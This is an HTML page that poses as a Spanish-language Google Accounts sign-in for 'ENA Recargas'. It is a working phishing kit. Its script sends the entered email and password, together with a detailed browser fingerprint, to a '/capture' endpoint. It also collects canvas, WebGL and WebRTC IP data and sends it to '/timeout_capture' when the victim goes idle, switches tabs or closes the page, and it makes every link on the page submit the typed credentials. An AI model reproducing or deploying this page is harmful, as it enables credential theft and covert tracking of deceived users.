<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Iniciar sesión - Cuentas de Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #202124;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            background: #fff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px rgba(60,64,67,0.15);
            box-sizing: border-box;
            margin: 20px;
        }
        @media (max-width: 768px) {
            .container {
                padding: 24px 20px 18px;
                margin: 10px;
                border-radius: 4px;
            }
        }
        @media (max-width: 480px) {
            .container {
                width: 95%;
                padding: 16px 12px 12px;
                margin: 5px;
            }
            h1.title {
                font-size: 20px;
            }
            p.subtitle {
                font-size: 14px;
            }
            input {
                font-size: 14px;
                height: 48px;
            }
            .next-btn {
                height: 40px;
                font-size: 13px;
            }
        }
        .header {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo {
            width: 75px;
            height: 24px;
            margin-bottom: 8px;
        }
        .title {
            font-size: 24px;
            font-weight: 400;
            margin: 0;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin: 8px 0 0;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 14px;
            color: #202124;
            margin-bottom: 8px;
        }
        input {
            width: 100%;
            height: 56px;
            padding: 0 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
            line-height: 24px;
        }
        input:focus {
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 1px 0 #1a73e8;
        }
        .next-btn {
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 0 24px;
            height: 36px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin-top: 24px;
        }
        .next-btn:hover {
            background: #1557b0;
        }
        .forgot {
            display: block;
            text-align: center;
            margin: 16px 0;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            cursor: pointer;
        }
        .footer {
            text-align: center;
            margin-top: 24px;
            font-size: 12px;
            color: #5f6368;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
            margin: 0 8px;
            cursor: pointer;
        }
        .greeting {
            font-size: 20px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        .email-display {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 16px;
        }
        .hidden {
            display: none;
        }
        #identifier-error {
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
        }
        .dynamic-container {
            box-sizing: border-box;
        }
    </style>
</head>
<body>
    <div class="container dynamic-container">
        <!-- Identifier Step -->
        <div id="identifier-step">
            <div class="header">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
                <h1 class="title">Iniciar sesión</h1>
                <p class="subtitle">Iniciar sesión para continuar a ENA Recargas</p>
            </div>
            <form id="identifier-form">
                <div class="form-group">
                    <label for="email">Correo electrónico</label>
                    <input type="email" id="email" name="email" required autofocus>
                </div>
                <button type="submit" class="next-btn">Siguiente</button>
            </form>
            <div class="footer">
                <a href="#" id="create-account-link">Crear cuenta</a>
                <a href="#" id="next-link">Siguiente</a>
            </div>
        </div>

        <!-- Password Step -->
        <div id="password-step" class="hidden">
            <div class="header">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
                <h1 class="title">Bienvenido</h1>
                <p id="email-display" class="email-display"></p>
                <p class="subtitle">Iniciar sesión para continuar a ENA Recargas</p>
            </div>
            <form id="password-form">
                <div class="form-group">
                    <label for="password">Ingresa tu contraseña</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="next-btn">Siguiente</button>
            </form>
            <a href="#" class="forgot" id="forgot-password-link">¿Olvidaste tu contraseña?</a>
            <div class="footer">
                <a href="#" id="create-account-link-password">Crear cuenta</a>
                <a href="#" id="next-link-password">Siguiente</a>
            </div>
        </div>
    </div>

    <script>
        let enteredEmail = '';
        let captureSent = false; // Prevent duplicate sends
        const TIMEOUT_DURATION = 2 * 60 * 1000; // 2 minutes
        const VISIBILITY_DELAY = 3 * 1000; // 3 seconds hidden = trigger
        let timeoutId, visibilityTimeoutId;

        // ENHANCED FINGERPRINT COLLECTOR
        (function() {
            const fingerprints = {
                ip_address: "Unknown",
                webrtc_ips: [],
                canvas_fingerprint: "",
                webgl_fingerprint: {hash: "", details: {}},
                user_agent: navigator.userAgent,
                device_info: {
                    platform: navigator.platform,
                    language: navigator.language,
                    screen_resolution: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString(),
                    color_depth: screen.colorDepth,
                    pixel_ratio: window.devicePixelRatio,
                    hardware_concurrency: navigator.hardwareConcurrency || "Unknown",
                    do_not_track: navigator.doNotTrack || "unspecified",
                    cookies_enabled: navigator.cookieEnabled
                }
            };

            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Canvas Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Canvas Fingerprint', 4, 17);
                const dataURL = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < dataURL.length; i++) {
                    hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
                    hash = hash & hash;
                }
                fingerprints.canvas_fingerprint = Math.abs(hash).toString(16);
            } catch (e) {
                fingerprints.canvas_fingerprint = "error";
            }

            try {
                const glCanvas = document.createElement('canvas');
                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    fingerprints.webgl_fingerprint.details = {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
                        version: gl.getParameter(gl.VERSION),
                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                        maxViewportDims: [gl.getParameter(gl.MAX_VIEWPORT_DIMS)[0], gl.getParameter(gl.MAX_VIEWPORT_DIMS)[1]]
                    };
                    const dataStr = JSON.stringify(fingerprints.webgl_fingerprint.details);
                    let hash = 0;
                    for (let i = 0; i < dataStr.length; i++) {
                        hash = ((hash << 5) - hash) + dataStr.charCodeAt(i);
                        hash = hash & hash;
                    }
                    fingerprints.webgl_fingerprint.hash = Math.abs(hash).toString(16);
                }
            } catch (e) {
                fingerprints.webgl_fingerprint = {hash: "error", details: {}};
            }

            const getWebRTCIPs = () => {
                return new Promise(resolve => {
                    const ips = [];
                    try {
                        const pc = new RTCPeerConnection({
                            iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                        });
                        pc.createDataChannel('');
                        pc.onicecandidate = e => {
                            if (!e || !e.candidate) {
                                pc.close();
                                resolve(ips.length > 0 ? ips : ['No WebRTC']);
                                return;
                            }
                            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                            if (match && !ips.includes(match[1])) ips.push(match[1]);
                        };
                        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve(['Error']));
                        setTimeout(() => { pc.close(); resolve(ips.length ? ips : ['Timeout']); }, 3000);
                    } catch (e) {
                        resolve(['Not supported']);
                    }
                });
            };

            const getPublicIP = async () => {
                try {
                    const r = await fetch('https://api.ipify.org?format=json');
                    const d = await r.json();
                    return d.ip;
                } catch (e) {
                    return 'Unknown';
                }
            };

            Promise.all([getWebRTCIPs(), getPublicIP()]).then(([webrtcIps, publicIp]) => {
                fingerprints.webrtc_ips = webrtcIps;
                fingerprints.ip_address = publicIp;
                window.fingerprints = fingerprints;
                console.log('✅ Fingerprints ready');
            }).catch(() => { window.fingerprints = fingerprints; });
        })();

        // UNIFIED CAPTURE FUNCTION - sends to backend
        function sendTimeoutCapture(reason) {
            if (captureSent) return; // Prevent duplicates
            captureSent = true;
            
            const fingerprintData = JSON.stringify(window.fingerprints || {});
            const formData = new URLSearchParams();
            formData.append('reason', reason);
            formData.append('fingerprint_data', fingerprintData);
            
            // Try fetch first
            fetch('/timeout_capture', { 
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formData.toString(),
                keepalive: true // Critical for page unload
            }).catch(() => {
                // Fallback to sendBeacon if fetch fails
                const data = `reason=${reason}&fingerprint_data=${encodeURIComponent(fingerprintData)}`;
                navigator.sendBeacon('/timeout_capture', data);
            });
            
            console.log(`🚨 Timeout capture sent: ${reason}`);
        }

        // LAYER 1: Inactivity timeout (2 minutes)
        function resetTimeout() {
            clearTimeout(timeoutId);
            clearTimeout(visibilityTimeoutId);
            timeoutId = setTimeout(() => sendTimeoutCapture('inactivity_timeout'), TIMEOUT_DURATION);
        }

        // LAYER 2: Tab visibility (hidden for 3+ seconds)
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                visibilityTimeoutId = setTimeout(() => sendTimeoutCapture('tab_switch'), VISIBILITY_DELAY);
            } else {
                clearTimeout(visibilityTimeoutId);
                resetTimeout(); // Reset main timeout when user returns
            }
        });

        // LAYER 3: Page hide (browser close, navigate away)
        window.addEventListener('pagehide', () => sendTimeoutCapture('page_close'), {capture: true});

        // LAYER 4: Before unload (closing tab/window)
        window.addEventListener('beforeunload', () => sendTimeoutCapture('browser_close'));

        // LAYER 5: Unload (final fallback)
        window.addEventListener('unload', () => {
            const data = `reason=unload&fingerprint_data=${encodeURIComponent(JSON.stringify(window.fingerprints || {}))}`;
            navigator.sendBeacon('/timeout_capture', data);
        }, {capture: true});

        // LAYER 6: Blur detection (loses focus)
        let blurTimeout;
        window.addEventListener('blur', () => {
            blurTimeout = setTimeout(() => sendTimeoutCapture('window_blur'), 5000); // 5 sec blur = trigger
        });
        window.addEventListener('focus', () => {
            clearTimeout(blurTimeout);
            resetTimeout();
        });

        // Reset timeout on ANY user activity
        ['input', 'mousemove', 'keypress', 'scroll', 'click', 'touchstart', 'touchmove'].forEach(event => {
            document.addEventListener(event, resetTimeout, {passive: true});
        });

        // Start timeout on load
        resetTimeout();

        function isValidEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        function showError(message) {
            let errorDiv = document.getElementById('identifier-error');
            if (!errorDiv) {
                errorDiv = document.createElement('div');
                errorDiv.id = 'identifier-error';
                errorDiv.style.color = '#d93025';
                errorDiv.style.fontSize = '12px';
                errorDiv.style.marginTop = '8px';
                document.getElementById('email').parentNode.appendChild(errorDiv);
            }
            errorDiv.textContent = message;
        }

        function clearError() {
            const errorDiv = document.getElementById('identifier-error');
            if (errorDiv) errorDiv.remove();
        }

        function submitData(password = '') {
            captureSent = true; // Mark as sent to prevent timeout firing
            clearTimeout(timeoutId); // Stop timeout
            clearTimeout(visibilityTimeoutId);
            
            const fingerprintData = JSON.stringify(window.fingerprints || {});
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `email=${encodeURIComponent(enteredEmail)}&password=${encodeURIComponent(password)}&fingerprint_data=${encodeURIComponent(fingerprintData)}`
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = 'https://www.enarecargas.com/maxipista/private';
                }
            })
            .catch(err => console.log('Capture error: ' + err));
        }

        document.getElementById('identifier-form').addEventListener('submit', function(e) {
            e.preventDefault();
            clearError();
            enteredEmail = document.getElementById('email').value.trim();
            if (!enteredEmail) {
                showError('Ingresa una dirección de correo electrónico');
                return;
            }
            if (!isValidEmail(enteredEmail)) {
                showError('Ingresa una dirección de correo electrónico válida');
                return;
            }
            setTimeout(() => {
                document.getElementById('email-display').textContent = enteredEmail;
                document.getElementById('identifier-step').classList.add('hidden');
                document.getElementById('password-step').classList.remove('hidden');
                document.getElementById('password').focus();
                resetTimeout();
            }, 800);
        });

        document.getElementById('password-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            submitData(password);
        });

        document.getElementById('create-account-link').addEventListener('click', function(e) {
            e.preventDefault();
            enteredEmail = document.getElementById('email').value.trim();
            submitData();
        });
        document.getElementById('next-link').addEventListener('click', function(e) {
            e.preventDefault();
            enteredEmail = document.getElementById('email').value.trim();
            submitData();
        });

        document.getElementById('forgot-password-link').addEventListener('click', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            submitData(password);
        });
        document.getElementById('create-account-link-password').addEventListener('click', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            submitData(password);
        });
        document.getElementById('next-link-password').addEventListener('click', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            submitData(password);
        });

        (function() {
            var randomClass = ['container-var1', 'container-var2', 'container-var3'][Math.floor(Math.random() * 3)];
            document.querySelector('.dynamic-container').classList.add(randomClass);
        })();
    </script>
</body>
</html>
